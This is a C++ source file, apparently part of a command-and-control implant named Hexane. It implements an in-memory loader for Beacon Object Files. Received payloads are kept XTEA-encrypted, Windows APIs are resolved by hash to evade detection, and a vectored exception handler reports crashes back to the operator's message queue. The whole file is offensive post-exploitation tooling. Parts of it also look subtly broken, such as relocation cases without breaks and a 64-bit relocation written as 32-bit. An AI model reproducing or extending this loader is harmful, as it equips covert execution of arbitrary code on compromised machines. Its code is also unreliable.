#include <core/include/objects.hpp>

using namespace Xtea;
using namespace Opsec;
using namespace Stream;
using namespace Memory::Methods;
using namespace Utils::Scanners;
using namespace Utils;

namespace Objects {

    PVOID DATA wrapper_return = nullptr;

    // TODO: add common BOF/internal implant functions
    HASH_MAP RDATA internal_map[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };

    HASH_MAP RDATA bof_map[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };


    LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {

        _stream *stream = CreateTaskResponse(TypeError);

        exception->ContextRecord->IP_REG = U_PTR(wrapper_return);

        PackUint32(stream,   ERROR_UNHANDLED_EXCEPTION);
        PackUint32(stream,   exception->ExceptionRecord->ExceptionCode);
        PackPointer(stream, C_PTR(U_PTR(exception->ExceptionRecord->ExceptionAddress)));

        Dispatcher::MessageQueue(stream);

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    VOID WrapperFunction(void *address, void *args, size_t size) {

        auto function = (OBJ_ENTRY) address;

        wrapper_return = __builtin_extract_return_addr(__builtin_return_address(0));
        function((char*)args, size);
    }

    BOOL ProcessSymbol(char* sym_string, void** pointer) {

        char *function  = nullptr;

        *pointer = nullptr;
        // __imp_Beacon
        if (HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {

            function = sym_string + COFF_PREP_BEACON_SIZE;
            return MapScan(bof_map, HashStringA(function, MbsLength(function)), pointer);
        }
        // __imp_
        if (HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
            bool import = SymbolScan(sym_string, '$', MbsLength(sym_string));

            if (import) {
                char buffer[MAX_PATH] = { };

                auto count = 0;
                auto split = NewSplit(sym_string + COFF_PREP_SYMBOL_SIZE, "$", &count);
#ifdef _M_IX86
                Trim(split[1], '@');
#endif
                auto lib_hash   = HashStringA(MbsToLower(buffer, split[0]), MbsLength(split[0]));
                auto fn_hash    = HashStringA(MbsToLower(buffer, split[1]), MbsLength(split[1]));

                FreeSplit(split, count);
                C_PTR_HASHES(*pointer, lib_hash, fn_hash);

                return *pointer ? true : false;
            }

            function = sym_string + COFF_PREP_SYMBOL_SIZE;
            Trim(function, '@');

            return MapScan(internal_map, HashStringA(function, MbsLength(function)), pointer);
        }
        // .refptr.__instance
        if (HashStringA(sym_string, MbsLength(sym_string)) == COFF_INSTANCE) {

            *pointer = (_hexane*) C_DREF(GLOBAL_OFFSET);
            return *pointer ? true : false;
        }

        return false;
    }

    BOOL ExecuteFunction(PEXECUTABLE exe, CONST CHAR *entry, VOID *args, CONST SIZE_T size) {
        HEXANE;

        VOID *veh_handle = nullptr;
        VOID *entrypoint = nullptr;
        CHAR *sym_name   = nullptr;

        BOOL success = true;
        const auto file_head = exe->nt_head->FileHeader;

        // NOTE: register veh as execution safety net
        if (!(veh_handle = ctx->memapi.RtlAddVectoredExceptionHandler(1, &ExceptionHandler))) {
            success = false;
            goto defer;
        }

        // NOTE: set section memory attributes
        for (auto sec_index = 0; sec_index < file_head.NumberOfSections; sec_index++) {
            const auto section  = SECTION_HEADER(exe->buffer, sec_index);

            if (section->SizeOfRawData > 0) {
                DWORD protect = 0;

                switch (section->Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) {
                case PAGE_NOACCESS:         protect = PAGE_NOACCESS; break;
                case IMAGE_SCN_MEM_EXECUTE: protect = PAGE_EXECUTE; break;
                case IMAGE_SCN_MEM_READ:    protect = PAGE_READONLY; break;
                case IMAGE_SCN_MEM_WRITE:   protect = PAGE_WRITECOPY; break;
                case IMAGE_SCN_MEM_RX:      protect = PAGE_EXECUTE_READ; break;
                case IMAGE_SCN_MEM_WX:      protect = PAGE_EXECUTE_WRITECOPY; break;
                case IMAGE_SCN_MEM_RW:      protect = PAGE_READWRITE; break;
                case IMAGE_SCN_MEM_RWX:     protect = PAGE_EXECUTE_READWRITE; break;
                default:
                    success = false;
                    goto defer;
                }

                if ((section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
                    protect |= PAGE_NOCACHE;
                }

                if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (VOID**) &exe->sec_map[sec_index].address, &exe->sec_map[sec_index].size, protect, nullptr))) {
                    success = false;
                    goto defer;
                }
            }
        }

        if (exe->fn_map->size) {
            if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (VOID**) &exe->fn_map->address, &exe->fn_map->size, PAGE_READONLY, nullptr))) {
                success = false;
                goto defer;
            }
        }

        // NOTE: get names from COFF symbol table and find entrypoint
        for (auto sym_index = 0; sym_index < file_head.NumberOfSymbols; sym_index++) {
            const auto symbols = exe->symbols;

            if (symbols[sym_index].First.Value[0]) {
                sym_name = symbols[sym_index].First.Name; // inlined
            }
            else {
                sym_name = (CHAR*) (symbols + file_head.NumberOfSymbols) + symbols[sym_index].First.Value[1]; // not inlined
            }

            // NOTE: compare symbols to entry names / entrypoint
            if (MemCompare(sym_name, entry, MbsLength(entry)) == 0) {
                entrypoint = exe->sec_map[symbols[sym_index].SectionNumber - 1].address + symbols[sym_index].Value;

            }
        }

        // NOTE: find section where entrypoint can be found and assert is RX
        for (auto sec_index = 0; sec_index < file_head.NumberOfSections; sec_index++) {
            if (entrypoint >= exe->sec_map[sec_index].address && entrypoint < exe->sec_map[sec_index].address + exe->sec_map[sec_index].size) {

                const auto section = SECTION_HEADER(exe->buffer, sec_index);

                if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SCN_MEM_EXECUTE) {
                    success = false;
                    goto defer;
                }
            }
        }

        WrapperFunction(entrypoint, args, size);

    defer:
        if (veh_handle) {
            ctx->memapi.RtlRemoveVectoredExceptionHandler(veh_handle);
        }

        return success;
    }

    BOOL BaseRelocation(PEXECUTABLE exe) {

        CHAR sym_name[9]    = { };
        CHAR *name_ptr      = nullptr;

        BOOL success = true;

        const auto buffer   = exe->buffer;
        const auto symbols  = exe->symbols;

        for (auto sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
            void *function = nullptr;

            PIMAGE_SECTION_HEADER section = SECTION_HEADER(buffer, sec_index);
            PRELOC reloc = RELOC_SECTION(buffer, section);

            for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
                PCOFF_SYMBOL head = &symbols[reloc->SymbolTableIndex];
                DWORD fn_count = 0;

                if (head->First.Value[0]) {
                    MemSet(sym_name, 0, 9);
                    MemCopy(sym_name, head->First.Name, 8);
                    name_ptr = sym_name;
                }
                else {
                    name_ptr = (CHAR*) (symbols + exe->nt_head->FileHeader.NumberOfSymbols) + head->First.Value[1];
                }

                VOID *reloc_addr    = exe->sec_map[sec_index].address + reloc->VirtualAddress;
                VOID *sec_addr      = exe->sec_map[head->SectionNumber - 1].address;
                VOID *fn_addr       = exe->fn_map + fn_count * sizeof(VOID*);

                if (!ProcessSymbol(name_ptr, &function)) {
                    success = false;
                    goto defer;
                }
#if _WIN64
                if (function) {
                    switch (reloc->Type) {
                        case IMAGE_REL_AMD64_REL32: {
                            *(VOID**) fn_addr       = function;
                            *(UINT32*) reloc_addr = U_PTR(fn_addr) - U_PTR(reloc_addr) - sizeof(UINT32);
                        }
                        default:
                            break;

                    }
                }
                else {
                    switch (reloc->Type) {
                        case IMAGE_REL_AMD64_REL32:     *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        case IMAGE_REL_AMD64_REL32_1:   *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 1;
                        case IMAGE_REL_AMD64_REL32_2:   *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 2;
                        case IMAGE_REL_AMD64_REL32_3:   *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 3;
                        case IMAGE_REL_AMD64_REL32_4:   *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 4;
                        case IMAGE_REL_AMD64_REL32_5:   *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 5;
                        case IMAGE_REL_AMD64_ADDR32NB:  *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        case IMAGE_REL_AMD64_ADDR64:    *(uint64_t*) reloc_addr = *(uint64_t*) reloc_addr + U_PTR(sec_addr);
                        default:
                            break;
                    }
                }
#else
                if (function) {
                    switch (reloc_addr->Type) {
                        case IMAGE_REL_I386_DIR32: {
                            *(void**) fn_addr       = function;
                            *(uint32_t*) reloc_addr = U_PTR(fn_addr);
                        }
                        default:
                            break;
                    }
                }
                else {
                    switch (reloc_addr->Type) {
                        case IMAGE_REL_I386_DIR32: *(uint32_t*)reloc_addr = (*(uint32_t*)reloc_addr) + U_PTR(sec_addr);
                        case IMAGE_REL_I386_REL32: *(uint32_t*)reloc_addr = (*(uint32_t*)reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        default:
                            break;
                    }
                }
#endif
                reloc += sizeof(_reloc);
            }
        }

        defer:
        return success;
    }

    BOOL MapSections(PEXECUTABLE module) {
        HEXANE;

        auto region_size = (SIZE_T) module->nt_head->OptionalHeader.SizeOfImage;
        const auto pref_base  = module->nt_head->OptionalHeader.ImageBase;

        module->base = pref_base;

        if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
            module->base != pref_base) {

            module->base = 0;
            region_size = module->nt_head->OptionalHeader.SizeOfImage;

            if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
                return false;
            }
        }

        for (auto i = 0; i < module->nt_head->OptionalHeader.SizeOfHeaders; i++) {
            B_PTR(module->base)[i] = module->buffer[i];
        }

        for (auto i = 0; i < module->nt_head->FileHeader.NumberOfSections; i++, module->section++) {
            for (auto j = 0; j < module->section->SizeOfRawData; j++) {

                (B_PTR(module->base + module->section->VirtualAddress))[j] = (module->buffer + module->section->PointerToRawData)[j];
            }
        }

        UINT_PTR base_offset = module->base - pref_base;
        PIMAGE_DATA_DIRECTORY relocdir  = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        // if non-zero rva and relocdir exists...
        if ((module->base - pref_base) && relocdir) {
            PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, module->base, relocdir->VirtualAddress);

            do {
                PBASE_RELOCATION_ENTRY head = (PBASE_RELOCATION_ENTRY) reloc + 1;

                do {
                    switch (head->Type) {
                        case IMAGE_REL_BASED_DIR64:     *(UINT32*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_offset; break;
                        case IMAGE_REL_BASED_HIGHLOW:   *(UINT32*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (UINT32) base_offset; break;
                        case IMAGE_REL_BASED_HIGH:      *(UINT32*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_offset); break;
                        case IMAGE_REL_BASED_LOW:       *(UINT32*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_offset); break;
                    }
                    head++;

                } while (B_PTR(head) != B_PTR(reloc) + reloc->SizeOfBlock);

                reloc = (PIMAGE_BASE_RELOCATION) head;
            } while (reloc->VirtualAddress);
        }

        module->nt_head->OptionalHeader.ImageBase = module->base; // set the prefered base to the real base
        return true;
    }

    SIZE_T GetFunctionMapSize(EXECUTABLE *image) {

        CHAR sym_name[9]    = { };
        INT counter         = 0;

        for (auto sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
            const auto section  = SECTION_HEADER(image->buffer, sec_index);
            auto reloc          = RELOC_SECTION(image->buffer, image->section);

            for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
                CHAR *buffer        = nullptr;
                const auto symbols  = image->symbols;

                if (PCOFF_SYMBOL symbol = &symbols[reloc->SymbolTableIndex]; symbol->First.Value[0]) {
                    MemSet(sym_name, 0, sizeof(sym_name));
                    MemCopy(sym_name, symbol->First.Name, 8);
                    buffer = sym_name;
                }
                else {
                    buffer = RVA(CHAR*, symbols, image->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                }

                if (HashStringA(buffer, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                    counter++;
                }

                reloc = reloc + sizeof(_reloc);
            }
        }

        return sizeof(void*) * counter;
    }

    VOID AddCoff(COFF_PARAMS *coff) {
        HEXANE;

        PCOFF_PARAMS head = ctx->bof_cache;

        if (ENCRYPTED) {
            XteaCrypt(B_PTR(coff->data), coff->data_size, ctx->config.session_key, true);
            XteaCrypt(B_PTR(coff->args), coff->args_size, ctx->config.session_key, true);
            XteaCrypt(B_PTR(coff->entrypoint), coff->entrypoint_length, ctx->config.session_key, true);
        }

        if (!ctx->bof_cache) {
            ctx->bof_cache = coff;
        }
        else {
            do {
                if (head->next) {
                    head = head->next;
                }
                else {
                    head->next = coff;
                    break;
                }
            }
            while (true);
        }
    }

    COFF_PARAMS* GetCoff(const uint32_t bof_id) {
        HEXANE;

        auto head = ctx->bof_cache;
        // NOTE: coff_id will be a known name hash

        do {
            if (head) {
                if (head->bof_id == bof_id) {
                    if (ENCRYPTED) {
                        XteaCrypt(B_PTR(head->data), head->data_size, ctx->config.session_key, false);
                        XteaCrypt(B_PTR(head->args), head->args_size, ctx->config.session_key, false);
                        XteaCrypt(B_PTR(head->entrypoint), head->entrypoint_length, ctx->config.session_key, false);
                    }

                    return head;
                }

                head = head->next;
            }
            else {
                return nullptr;
            }
        }
        while (true);
    }

    VOID RemoveCoff(CONST UINT32 bof_id) {
        HEXANE;

        PCOFF_PARAMS prev = { };

        if (!bof_id) {
            return;
        }

        for (auto head = ctx->bof_cache; head; head = head->next) {
            if (head->bof_id == bof_id) {

                if (prev) {
                    prev->next = head->next;
                }
                else {
                    ctx->bof_cache = head->next;
                }

                MemSet(head->data, 0, head->data_size);
                MemSet(head->args, 0, head->args_size);
                MemSet(head->entrypoint, 0, head->entrypoint_length);

                Free(head->data);
                Free(head->args);
                Free(head->entrypoint);
                Free(head);

                return;
            }

            prev = head;
        }
    }

    VOID Cleanup(EXECUTABLE *image) {
        HEXANE;

        if (!image || !image->base) {
            return;
        }
        if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (VOID**) &image->base, &image->size, PAGE_READWRITE, nullptr))) {
            // LOG ERROR
            return;
        }

        MemSet((VOID*) image->base, 0, image->size);

        VOID *pointer   = (VOID*) image->base;
        SIZE_T size     = image->size;

        if (!NT_SUCCESS(ntstatus = ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), &pointer, &size, MEM_RELEASE))) {
            // LOG ERROR
            return;
        }

        if (image->sec_map) {
            ZeroFree(image->sec_map, image->nt_head->FileHeader.NumberOfSections * sizeof (IMAGE_SECTION_HEADER));
            image->sec_map = nullptr;
        }

        ZeroFree(image, sizeof(EXECUTABLE));
    }

    VOID CoffLoader(CONST CHAR *entrypoint, VOID *data, VOID *args, CONST SIZE_T args_size) {
        HEXANE;
        // NOTE: sec_map seems to be the only thing that persists

        EXECUTABLE *image = CreateImageData((UINT8*) data); ;
        BOOL success = true;

        auto next = (UINT8*) image->base;

        x_assertb(image->buffer    = (UINT8*) data);
        x_assertb(image->sec_map   = (OBJECT_MAP*) Malloc(sizeof(void*) * sizeof(OBJECT_MAP)));

        x_assertb(ImageCheckArch(image));
        image->fn_map->size = GetFunctionMapSize(image);

        // NOTE: calculating address/size of sections before base relocation
        for (auto sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
            const auto section = SECTION_HEADER(image->buffer, sec_index);

            image->size += section->SizeOfRawData;
            image->size = (SIZE_T) PAGE_ALIGN(image->size);
        }

        image->size += image->fn_map->size;

        x_ntassertb(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**) &image->base, image->size, &image->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

        for (auto sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
            const auto section = SECTION_HEADER(image->buffer, sec_index);

            image->sec_map[sec_index].size     = section->SizeOfRawData;
            image->sec_map[sec_index].address  = next;

            next += image->section->SizeOfRawData;
            next = PAGE_ALIGN(next);

            MemCopy(image->sec_map[sec_index].address, RVA(PBYTE, image->buffer, image->section->SizeOfRawData), image->section->SizeOfRawData);
        }

        // NOTE: function map goes after the section map ?
        image->fn_map = (OBJECT_MAP*) next;

        x_assertb(BaseRelocation(image));
        x_assertb(ExecuteFunction(image, entrypoint, args, args_size));

    defer:
        if (success) {
            // LOG SUCCESS?
        }
        else {
            // LOG ERROR
        }

        if (image) {
            Cleanup(image);
        }
    }

    VOID CoffThread(COFF_PARAMS *coff) {

        if (!coff->entrypoint || !coff->data) {
            return;
        }

        CoffLoader(coff->entrypoint, coff->data, coff->args, coff->args_size);
    }
}
